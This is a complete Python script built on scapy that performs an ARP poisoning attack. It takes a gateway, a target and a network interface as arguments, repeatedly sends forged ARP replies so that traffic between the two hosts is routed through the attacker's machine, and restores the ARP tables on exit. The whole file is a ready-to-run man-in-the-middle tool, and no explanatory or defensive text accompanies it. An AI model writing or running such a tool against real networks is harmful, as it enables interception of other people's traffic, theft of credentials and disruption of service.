#!/usr/bin/env python3

import scapy.all as scapy
import argparse

def main(gateway_ip, target_ip, interface):

    state = {
        'target': {
            'ip': target_ip,
            'mac': get_mac_address(target_ip, interface)
        },
        'gateway': {
            'ip': gateway_ip,
            'mac': get_mac_address(gateway_ip, interface)
        },
        'attacker': {
            'mac': scapy.get_if_hwaddr(interface)
        }
    }

    if not state['target']['mac'] or not state['gateway']['mac']:
        return

    print("Initial state:")
    print_state(state)

    print("Starting ARP poisoning attack...")
    try:
        while True:
            poison_arp(state['gateway']['ip'], state['gateway']['mac'], state['target']['ip'], state['attacker']['mac'], interface) # Target IP points to attacker on gateway ARP table
            poison_arp(state['target']['ip'], state['target']['mac'], state['gateway']['ip'], state['attacker']['mac'], interface) # Gateway IP points to attacker on target ARP table
            state = check_state(state, interface)
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        restore_arp(state['target']['ip'], state['target']['mac'], state['gateway']['ip'], state['gateway']['mac'], interface) # Gateway IP points to Gateway MAC on target ARP table
        restore_arp(state['gateway']['ip'], state['gateway']['mac'], state['target']['ip'], state['target']['mac'], interface) # Target IP points to Target MAC on gateway ARP table
        state = check_state(state, interface)

def get_mac_address(ip, interface):
    try:
        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst=ip) # ARP request (op=1)
        ans, _ = scapy.srp(arp_broadcast, timeout=2, verbose=0, iface=interface)
        return ans[0][1][1].hwsrc
    except IndexError:
        print(f"Could not get MAC address for {ip}.")
        return None

def print_state(state):
    print(f"Gateway: {state['gateway']['ip']} ({state['gateway']['mac']})")
    print(f"Target: {state['target']['ip']} ({state['target']['mac']})")
    print(f"Attacker: ({state['attacker']['mac']})")
    print()

def poison_arp(dest_ip, dest_mac, src_ip, attacker_mac, interface):
    arp_spoof = scapy.Ether(dst=dest_mac)/scapy.ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac, hwsrc=attacker_mac) # Fake ARP response (op=2)
    scapy.sendp(arp_spoof, iface=interface, verbose=0)

def restore_arp(dest_ip, dest_mac, src_ip, src_mac, interface):
    pkt = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, hwsrc=src_mac, hwdst=dest_mac, psrc=src_ip, pdst=dest_ip) # Correct ARP response (op=2)
    scapy.sendp(pkt, iface=interface, verbose=0)

def check_state(prev_state, interface):
    current_state = {
        'target': {
            'ip': prev_state['target']['ip'],
            'mac': get_mac_address(prev_state['target']['ip'], interface) or prev_state['target']['mac']
        },
        'gateway': {
            'ip': prev_state['gateway']['ip'],
            'mac': get_mac_address(prev_state['gateway']['ip'], interface) or prev_state['gateway']['mac']
        },
        'attacker': {
            'mac': prev_state['attacker']['mac']
        }
    }
    if current_state != prev_state:
        print("ARP tables have been modified:")
        print_state(current_state)
    return current_state

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog='ARP-Poisoning',
        description='Script for performing ARP poisoning attack'
    )
    parser.add_argument('-g', '--gateway', help='IPv4 address of the gateway', required=True)
    parser.add_argument('-t', '--target', help='IPv4 address of the target', required=True)
    parser.add_argument('-i', '--interface', help='Network interface to use', required=True)
    args = parser.parse_args()
        
    gateway_ip = args.gateway
    target_ip = args.target
    interface = args.interface

    main(gateway_ip, target_ip, interface)
